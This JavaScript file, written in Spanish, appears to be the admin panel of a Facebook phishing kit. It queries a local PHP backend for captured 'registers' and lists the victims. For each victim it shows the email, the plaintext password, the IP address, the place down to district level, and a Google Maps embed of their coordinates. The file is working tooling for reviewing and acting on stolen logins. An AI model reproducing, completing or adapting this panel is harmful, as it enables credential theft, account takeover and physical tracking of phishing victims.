moment.updateLocale('en', {
    relativeTime: {
        future: "en %s",
        past: "hace %s",
        s: 'algunos segundos',
        ss: '%d segundos',
        m: "un minuto",
        mm: "%d minutos",
        h: "una hora",
        hh: "%d horas",
        d: "un dia",
        dd: "%d dias",
        w: "una semana",
        ww: "%d semanas",
        M: "un mes",
        MM: "%d meses",
        y: "un año",
        yy: "%d años"
    }
});
moment.lang('es', {
    months: 'Enero_Febrero_Marzo_Abril_Mayo_Junio_Julio_Agosto_Septiembre_Octubre_Noviembre_Diciembre'.split('_'),
    monthsShort: 'Ene._Feb._Mar._Abr._May._Jun._Jul._Ago._Sept._Oct._Nov._Dec.'.split('_'),
    monthsMin: 'Ene_Feb_Mar_Abr_May_Jun_Jul_Ago_Sept_Oct_Nov_Dec'.split('_'),
    weekdays: 'Domingo_Lunes_Martes_Miercoles_Jueves_Viernes_Sabado'.split('_'),
    weekdaysShort: 'Dom._Lun._Mar._Mier._Jue._Vier._Sab.'.split('_'),
    weekdaysMin: 'Do_Lu_Ma_Mi_Ju_Vi_Sa'.split('_')
});

function listRegisters() {
    $('#content').hide(250);
    if ($('#files').hasClass('users')) {
        dataByRegister($('#files').attr('data-id'));
    } else {
        $('#files').empty();
        $.ajax({
            url: 'http://localhost/facebook/admin/php/funcs.php',
            type: 'POST',
            data: {
                'function': 'findRegisters'
            }
        }).done(res => {
            if (res.status == 200) {
                res.data.forEach(file => {
                    template = `
                            <div onclick="selectFile(this)"
                            ondblclick="dataByRegister($(this).text().trim())">
                                <div class="img"></div>
                                ${file}
                            </div>
                            `;
                    $('#files').append(template);
                });
            }
        })
    }
}

function selectFile(file) {
    if ($(file).hasClass('selected')) {
        $(file).removeClass('selected');
    } else {
        $('#files > div').removeClass('selected');
        $(file).addClass('selected');
    }
}

function dataByRegister(file) {
    $('#files > div').removeClass('selected');
    $(file).addClass('selected');
    var fileName = file;
    $('#files').empty().addClass('users').attr('data-id', fileName).html(`
                <div id="back" title="Volver">
                    <div class="img"></div>
                    Volver
                </div>
            `);
    $.ajax({
        url: 'http://localhost/facebook/admin/php/funcs.php',
        type: 'POST',
        data: {
            'function': 'dataByRegister',
            'data': fileName
        }
    }).done(res => {
        if (res.status == 200) {
            res.data.forEach(user => {
                var id = user.id;
                var email = user.username.email;
                var time = moment(user.date).fromNow();
                template = `
                <div onclick="selectFile(this)"
                title="${email}
[${time}]" data-user='${JSON.stringify(user)}'
                ondblclick="showDataByUser(this)">
                    <div class="img"></div>
                    ${id}
                </div>
                `;
                $('#files').append(template);
            })
        }
    })
}

function showDataByUser(user) {
    $(user).addClass('selected');
    var dataUser = $(user).data('user');
    $('#id').text(dataUser.id);
    $('#email').text(dataUser.username.email);
    $('#pass').text(dataUser.username.pass);
    $('#date').text(moment(dataUser.date).format('Do/MM/YY h:mm:ss a'));
    var ip = dataUser.client.ip == '::1' ? '0.0.0.0': dataUser.client.ip;
    var continent = dataUser.client.continent ? dataUser.client.continent: 'Desconocido';
    var country = dataUser.client.country ? dataUser.client.country: 'Desconocido';
    var region = dataUser.client.province ? dataUser.client.province: 'Desconocido';
    var city = dataUser.client.district ? dataUser.client.district: 'Desconocido';
    var latitude = dataUser.client.geolocation.latitude ? dataUser.client.geolocation.latitude : 0;
    var longitude = dataUser.client.geolocation.longitude ? dataUser.client.geolocation.longitude : 0;
    $('#ip').text(ip);
    $('#continent').text(continent);
    $('#country').text(country);
    $('#region').text(region);
    $('#city').text(city);
    $('#latitude').text(latitude + ',');
    $('#longitude').text(' ' + longitude);
    $('#g-maps').attr('src', `https://www.google.com/maps/embed?origin=mfe&pb=!1m3!2m1!1s${latitude},${longitude}!6i15`);
    $('#content').show(250);
}

listRegisters();
$(document).on('click', '#back', function () {
    $('#files').removeClass('users');
    listRegisters();
})

function copyText(e) {
    var texto = $(e).children('span').text();
    var aux = document.createElement("input");
    aux.setAttribute("value", texto);
    document.body.appendChild(aux);
    aux.select();
    var res = document.execCommand("copy");
    if (res) {
        console.log('Copiado');
    } else {
        console.log('No copiado');
    }
    document.body.removeChild(aux);
}